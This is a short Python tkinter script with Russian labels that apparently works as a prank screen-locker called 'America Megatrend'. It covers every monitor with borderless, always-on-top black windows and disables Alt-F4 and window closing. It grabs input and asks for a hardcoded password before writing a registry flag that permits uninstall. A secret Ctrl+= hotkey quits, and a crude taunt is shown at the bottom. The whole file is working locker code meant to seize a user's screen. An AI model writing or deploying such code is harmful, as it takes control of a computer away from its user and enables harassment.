import tkinter as tk
import winreg
import sys
from screeninfo import get_monitors
#настройки
APP_NAME = "America Megatrend"
UNINSTALL_PASSWORD = "5225"   
REG_PATH = r"Software\AmericaMegatrend"
REG_NAME = "AllowUninstall"
EXIT_HOTKEY = "<Control-=>"  

def block_event(event):
    return "break"

def normal_exit(event=None):
    for w in windows:
        w.destroy()
    sys.exit(0)

def allow_uninstall():
    password = entry_password.get()

    if password != UNINSTALL_PASSWORD:
        label_status.config(
            text="Неверный пароль",
            fg="red"
        )
        entry_password.delete(0, tk.END)
        return
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, "1")
        winreg.CloseKey(key)

        label_status.config(
            text="Удаление разрешено.",
            fg="lime"
        )
        button_uninstall.config(state="disabled")
        entry_password.config(state="disabled")

    except Exception as e:
        label_status.config(
            text=f"Ошибка записи в реестр:\n{e}",
            fg="red"
        )
windows = []
monitors = get_monitors()
for i, m in enumerate(monitors):
    win = tk.Tk() if i == 0 else tk.Toplevel()
    win.overrideredirect(True)
    win.attributes("-topmost", True)

    win.geometry(f"{m.width}x{m.height}+{m.x}+{m.y}")
    win.bind("<Alt-F4>", block_event)
    win.bind(EXIT_HOTKEY, normal_exit)
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    frame = tk.Frame(win, bg="black")
    frame.pack(expand=True, fill="both")

    label = tk.Label(
        frame,
        text="AMERICA MEGATREND",
        fg="red",
        bg="black",
        font=("Arial", 36)
    )
    label.pack(expand=True)
    windows.append(win)

main = windows[0]
main_frame = main.winfo_children()[0]
label_info = tk.Label(
    main_frame,
    text="Для удаления программы введите пароль",
    fg="white",
    bg="black",
    font=("Arial", 20)
)
label_info.pack(pady=20)

entry_password = tk.Entry(
    main_frame,
    font=("Arial", 20),
    show="*",
    width=20,
    justify="center"
)
entry_password.pack(pady=10)

button_uninstall = tk.Button(
    main_frame,
    text="Подтвердить удаление",
    command=allow_uninstall,
    font=("Arial", 18),
    bg="#aa0000",
    fg="white",
    padx=20,
    pady=10
)
button_uninstall.pack(pady=20)

label_status = tk.Label(
    main_frame,
    text="",
    fg="white",
    bg="black",
    font=("Arial", 16)
)
label_status.pack(pady=20)

label_hint = tk.Label(
    main_frame,
    text="сосал?",
    fg="gray",
    bg="black",
    font=("Arial", 12)
)
label_hint.pack(side="bottom", pady=20)




main.grab_set()
main.mainloop()
